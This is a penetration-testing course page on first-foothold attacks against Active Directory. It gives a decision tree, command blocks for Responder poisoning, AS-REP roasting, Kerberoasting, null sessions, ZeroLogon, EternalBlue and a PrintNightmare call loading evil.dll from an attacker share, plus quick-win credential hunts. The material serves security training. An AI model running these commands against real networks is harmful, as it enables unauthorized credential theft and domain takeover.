# Initial Foothold Strategies

## Unit 3 - Topic 6 | Initial Access Scenarios

---

## Overview

**Initial foothold strategies** combine various techniques to gain the first domain credential or code execution in an Active Directory environment. Success depends on choosing the right approach based on the target's security posture and available attack surface.

---

## 1. Initial Access Decision Tree

```
INITIAL ACCESS STRATEGY:

DO YOU HAVE NETWORK ACCESS?
├── YES (Internal/VPN)
│   ├── Can you see broadcast traffic?
│   │   ├── YES → Responder (LLMNR/NBT-NS poisoning)
│   │   └── NO → Password spraying / Phishing
│   │
│   ├── Can you scan the network?
│   │   ├── Scan for old/vulnerable systems
│   │   ├── Check for EternalBlue (MS17-010)
│   │   ├── Check for ZeroLogon (CVE-2020-1472)
│   │   ├── Check for PrintNightmare
│   │   └── Check for Exchange vulns (ProxyLogon/Shell)
│   │
│   └── Do you have ANY valid username?
│       ├── YES → AS-REP Roasting, Password Spraying
│       └── NO → Username enumeration first (Kerbrute)
│
└── NO (External only)
    ├── VPN portal? → Spray VPN credentials
    ├── OWA/Exchange? → Spray email credentials
    ├── O365/Azure? → MSOLSpray + MFASweep
    ├── Web apps? → Web exploitation → pivot internal
    └── Phishing → Credential capture / payload delivery
```

---

## 2. Unauthenticated Attacks

```bash
# === NO CREDENTIALS NEEDED ===

# 1. LLMNR/NBT-NS POISONING (Most common first step):
sudo responder -I eth0 -wrf
# Wait for hashes → crack → domain credentials

# 2. AS-REP ROASTING (Need usernames only):
kerbrute userenum -d corp.local --dc dc01 users.txt
GetNPUsers.py corp.local/ -dc-ip dc01 \
  -usersfile valid_users.txt -no-pass

# 3. SMB NULL SESSION:
crackmapexec smb dc01 -u '' -p ''
smbclient -L //dc01 -N
rpcclient dc01 -U "" -N
# Sometimes allows enumeration without auth

# 4. ANONYMOUS LDAP BIND:
ldapsearch -x -H ldap://dc01 -b "DC=corp,DC=local" \
  "(objectClass=*)"
# Some DCs allow unauthenticated LDAP queries

# 5. VULNERABILITY EXPLOITATION:
# ZeroLogon (CVE-2020-1472):
python3 zerologon.py dc01 dc01$
# Resets DC machine account password → full DC access!
# CRITICAL: Can break the DC — use with extreme caution

# EternalBlue (MS17-010):
nmap -p 445 --script smb-vuln-ms17-010 target
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue"

# PrintNightmare (CVE-2021-34527):
python3 printnightmare.py corp.local/user:pass@dc01 \
  '\\attacker\share\evil.dll'
```

---

## 3. Authenticated Initial Actions

```bash
# === ONCE YOU HAVE ONE SET OF CREDENTIALS ===

# STEP 1: Validate and assess
crackmapexec smb dc01 -u user -p pass
# Check: Admin? Regular user?

# STEP 2: Run BloodHound collection
bloodhound-python -u user -p pass -d corp.local \
  -ns dc01_ip -c all
# Maps entire AD attack surface

# STEP 3: Kerberoasting (service account hashes)
GetUserSPNs.py corp.local/user:pass -dc-ip dc01 -request
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt

# STEP 4: Check for quick wins
# Local admin anywhere?
crackmapexec smb 10.0.0.0/24 -u user -p pass
# (Pwn3d!) = admin access

# Accessible shares?
crackmapexec smb dc01 -u user -p pass --shares
# Spider for passwords:
crackmapexec smb dc01 -u user -p pass --spider C$ \
  --pattern password

# STEP 5: Enumerate everything
crackmapexec smb dc01 -u user -p pass --users
crackmapexec smb dc01 -u user -p pass --groups
crackmapexec smb dc01 -u user -p pass --pass-pol
```

---

## 4. Common Quick Wins

```
AFTER FIRST CREDENTIAL — CHECK IMMEDIATELY:

1. KERBEROASTING
   └── Service accounts often have weak passwords
       GetUserSPNs.py corp.local/user:pass -dc-ip dc01

2. GPP PASSWORDS (MS14-025)
   └── Encrypted passwords in SYSVOL with known key
       gpp-decrypt "encrypted_cpassword_value"

3. LAPS PASSWORDS
   └── If you can read ms-Mcs-AdmPwd attribute
       crackmapexec ldap dc01 -u user -p pass -M laps

4. PASSWORDS IN DESCRIPTIONS
   └── Admins store passwords in user descriptions
       Get-DomainUser -Properties name,description

5. PASSWORD REUSE
   └── Test captured password against other users
       crackmapexec smb dc01 -u users.txt -p 'captured_pass'

6. UNCONSTRAINED DELEGATION
   └── Machines that store TGTs for all authenticating users
       Get-DomainComputer -Unconstrained

7. ACLS / DACL ABUSE
   └── Check if your user has unexpected permissions
       Find-InterestingDomainAcl -ResolveGUIDs
```

---

## 5. Attack Prioritization Matrix

| Attack | Auth Needed | Risk Level | Success Rate |
|--------|:-----------:|:----------:|:------------:|
| **Responder** | None | Low | 🟢 High |
| **AS-REP Roast** | Username | Low | 🟡 Medium |
| **Password Spray** | None | Medium | 🟡 Medium |
| **Phishing** | None | Low | 🟡 Medium |
| **Kerberoast** | Domain user | Low | 🟢 High |
| **GPP passwords** | Domain user | Low | 🟡 Medium |
| **ZeroLogon** | None | 🔴 HIGH | 🟢 High |
| **EternalBlue** | None | Medium | 🟡 Medium |
| **SMB Relay** | None | Low | 🟢 High |

---

## Summary Table

| Phase | Key Actions |
|-------|------------|
| **No creds** | Responder, AS-REP Roast, spray, phishing |
| **First cred** | BloodHound, Kerberoast, shares, LAPS |
| **Local admin** | Dump SAM/LSASS, pivot, spray creds |
| **Domain user** | Full enumeration, ACL abuse, delegation |
| **Prioritize** | Low-risk, high-reward attacks first |

---

## Quick Revision Questions

1. **What is the most common first step in an internal AD pentest?**
2. **What attacks require zero credentials?**
3. **What should you do immediately after getting first domain credentials?**
4. **Why is ZeroLogon risky to use in real engagements?**
5. **How does Kerberoasting help after initial access?**

---

[← Previous: AS-REP Roasting](05-asrep-roasting.md)

---

*Unit 3 - Topic 6 of 6 | [Back to README](../README.md) | [Next Unit: Credential Attacks →](../04-Credential-Attacks/01-ntlm-hash-extraction.md)*
